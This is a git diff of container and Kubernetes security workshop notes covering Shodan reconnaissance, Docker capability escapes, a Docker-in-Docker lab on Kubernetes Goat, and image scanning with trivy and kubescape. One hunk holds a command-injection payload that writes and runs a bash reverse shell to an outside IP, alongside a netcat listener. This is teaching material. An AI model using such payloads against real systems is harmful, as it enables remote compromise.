@@ -1,5 +1,9 @@
 # container-security-workshop-notes
 
+## About me
+
+https://rewanthtammana.com/
+
 ## Notes
 
 ### Sample attacks & hacks across the globe
@@ -20,7 +24,7 @@ Kubernetes hacks doesn't have to be just a misconfiguration in kubernetes. Any v
 
 Everyday you see many hacks happening on the internet but you might not be sure how it happens. I will show a demonstration on how it's done end-to-end!
 
-shodan.io
+https://www.shodan.io/
 
 You can get the pro account for $5 for life time & it's worth it.
 
@@ -31,7 +35,6 @@ You can use their developer guide to write scripts to scrape the data, etc.
 https://github.com/JavierOlmedo/shodan-filters
 
 https://www.shodan.io/host/65.0.72.126
-
 
 You can use tools like https://github.com/xmendez/wfuzz or simple bash scripts to brute force the username & password
 
@@ -304,9 +307,9 @@ docker run --rm -it ubuntu chown nobody /tmp
 docker run --rm -it --cap-drop=all --cap-add=chown ubuntu chown nobody /tmp
 ```
 
-https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
-https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/
-https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
+* https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
+* https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/
+* https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
 
 ### Docker socket
 
@@ -336,6 +339,8 @@ watch -n 0.1 kubectl get po
 bash access-kubernetes-goat.sh
 ```
 
+Challenges list - http://127.0.0.1:1234/
+
 DIND (docker-in-docker) exploitation - http://127.0.0.1:1231/
 
 On your cloud instance, get ready to catch the reverse shell!
@@ -344,6 +349,7 @@ On your cloud instance, get ready to catch the reverse shell!
 Reference: https://systemweakness.com/a-persistent-reverse-shell-on-macos-40fb65b3dacf?gi=70e6704f4f9e
 
 ```bash
+# On your cloud instance
 nc -nlvp 8888
 ```
 
@@ -356,10 +362,10 @@ nc -nlvp 8888
 127.0.0.1;ls -l
 # Get a reverse shell to ease the enumeration
 127.0.0.1;echo "bash -i >& /dev/tcp/18.141.250.7/8888 0>&1" > /tmp/run.sh;cat /tmp/run.sh
-# echo "bash -i >& /dev/tcp/18.141.250.7/8888 0>&1" > /tmp/run.sh
 127.0.0.1;chmod +x /tmp/run.sh;bash /tmp/run.sh
 ```
 
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
 
 ```bash
 nc -nlvp 8888
@@ -376,8 +382,6 @@ cd docker
 ```
 
 An attacker can replace the existing images with malicious images. The end-user will never get to know & since the image is existing on the local system, the user will use it without any disruption. You can even run privileged containers, mount host system, change the file system, kernel files, & lot more.
-
-https://highon.coffee/blog/reverse-shell-cheat-sheet/
 
 docker-socket recon
 
@@ -423,17 +427,22 @@ trivy i argocd
 
 It will take sometime to build, so let's review multi-stage builds for a while.
 
+https://github.com/argoproj/argo-cd/blob/master/Dockerfile
+
+
+Change the base image in the dockerfile, rebuild the argocd image & then scan it. Most of the issues will be sorted out!
+
+
 https://docs.docker.com/develop/develop-images/multistage-build/
 
 ```bash
-trivy i ubuntu:22.10
+trivy i ubuntu:22.04
 trivy i ubuntu:21.10
 trivy i ubuntu:21.04
 ```
 
-Change the base image in the dockerfile, rebuild the argocd image & then scan it. Most of the issues will be sorted out!
 
-Distroless images
+**Distroless images**
 
 https://github.com/GoogleContainerTools/distroless
 
@@ -693,22 +702,35 @@ https://github.com/armosec/kubescape
 
 ```bash
 wget https://github.com/armosec/kubescape/releases/download/v2.0.164/kubescape-ubuntu-latest
-sudo mv kubescape-ubuntu-latest kubescape
+chmod +x kubescape-ubuntu-latest
+sudo mv kubescape-ubuntu-latest /usr/local/bin/kubescape
+```
+
+To gain best results, we can install the vulnerable cluster, kubernetes-goat on killercoda & then trigger the scan.
+
+```bash
+git clone https://github.com/madhuakula/kubernetes-goat.git
+cd kubernetes-goat
+bash setup-kubernetes-goat.sh
+bash access-kubernetes-goat.sh
 ```
 
 ```bash
 kubescape scan
 kubescape scan framework nsa
 kubescape scan framework nsa -v
+kubescape scan framework nsa -v --exclude-namespaces kube-system
+```
+
+```bash
+kubectl edit deploy system-monitor-deployment
 ```
 
 ### More
 
-There are more things like falco (runtime security), apparmor, selinux, mutating webhooks, seccomp, service mesh, tracing, & lot more.
+There are more things like apparmor, selinux, mutating webhooks, seccomp, service mesh, observability, tracing, & lot more that help to harden a container/Kubernetes environment.
 
-https://blog.rewanthtammana.com/creating-malicious-admission-controllers
+For further reading, you can check my article on how an attacker can gain persistence on kubernetes cluster by exploiting mutating webhooks here - https://blog.rewanthtammana.com/creating-malicious-admission-controllers
 
-Further practice on container internals & security
-
-https://contained.af/
+Further practice on container internals & security - https://contained.af/
 
